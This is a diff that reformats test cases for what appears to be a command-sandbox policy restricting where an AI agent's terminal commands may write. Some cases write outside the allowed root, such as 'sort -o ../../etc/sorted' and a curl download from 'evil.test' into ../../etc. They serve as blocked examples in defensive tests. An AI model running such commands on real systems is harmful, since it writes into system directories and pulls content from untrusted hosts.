@@ -225,7 +225,11 @@ def _cases(
         # Scoping `-o` to a per-command allow-list (instead of the shared
         # dir-flag set) must NOT weaken coverage for the compilers/runtimes
         # that genuinely write via `-o`. These stay flagged outside any root.
-        ("terminal", {"command": "sort -o ../../etc/sorted sorted.txt"}, "sort -o outside"),
+        (
+            "terminal",
+            {"command": "sort -o ../../etc/sorted sorted.txt"},
+            "sort -o outside",
+        ),
         (
             "terminal",
             {"command": "curl -o ../../etc/leak.html https://evil.test"},
@@ -303,7 +307,11 @@ def _cases(
         # blocked harmless read commands under the dev policy. (Note: `rsync
         # -o` and `unzip -o` ARE real writes and must stay blocked - they are
         # covered by the ESCAPE suite, not here.)
-        ("terminal", {"command": "ps -o pid=,command= -p 1"}, "ps -o is a format, not a write"),
+        (
+            "terminal",
+            {"command": "ps -o pid=,command= -p 1"},
+            "ps -o is a format, not a write",
+        ),
         ("terminal", {"command": "ps -o ppid="}, "ps -o ppid is a format"),
         ("terminal", {"command": "git -o foo status"}, "git -o is not a write"),
     ]
